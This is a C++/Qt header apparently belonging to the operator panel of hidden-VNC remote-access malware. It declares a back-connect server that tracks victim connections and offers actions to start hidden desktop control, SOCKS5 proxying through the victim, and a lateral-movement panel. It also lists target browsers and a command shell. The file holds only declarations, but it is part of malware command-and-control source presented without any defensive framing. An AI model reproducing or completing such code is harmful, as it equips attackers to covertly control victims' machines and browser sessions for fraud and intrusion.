#ifndef HVNCVIEWER_H
#define HVNCVIEWER_H
#include <QHBoxLayout>
#include <QVBoxLayout>
#include <QLabel>
#include <QMainWindow>
#include <QWindow>
#include <QTcpSocket>
#include <QTcpServer>
#include <QTableWidget>
enum SockType{
    REVERSE_CONNECTION,
    SOCKS5,
    HVNC,
    LATERAL
};

enum Sockets{
    DESKTOP,
    USER_INPUT,
    NOTHING
};
enum Browser{
    CHROME,
    FIREFOX,
    EDGE,
    OPERA,
    IE,
    EXPLORE,
    COMMAND
};
typedef struct _Connection{
// anything else in here
    QTcpSocket *HVNC_Sockets[1]; // enough shit for DESKTOP and USER_INPUT
    bool HVNC_Config;
    QTcpSocket *MainSock;
    QTcpSocket *SocksSocket;
    QTcpSocket *LateralSocket;
} Connection;
class hvncmain;
class backconnect : public QWidget
{
    Q_OBJECT
public:
    QTcpServer *tcpServer;
    QTableWidget* table;
    static QMap <QString, Connection*> ConnectionMap;
    explicit backconnect(QWidget *parent = nullptr);
    ~backconnect();
    static int listen_port;
QWidget *window;
    void newConnection();
protected:

private:
    QAction *start_hvnc;
    QAction *start_socks;
    QAction *disconnect_client;
    QAction *start_lateral;

    void onReadyRead();

    void disconnect_sock(QString peerName);
private slots:

    void startLateralMovementPanel();
    void hvnc_action();
    void disconnect_action();
    void socks_action();
    void showContextMenu(const QPoint &pos);
};

#endif // HVNCVIEWER_H
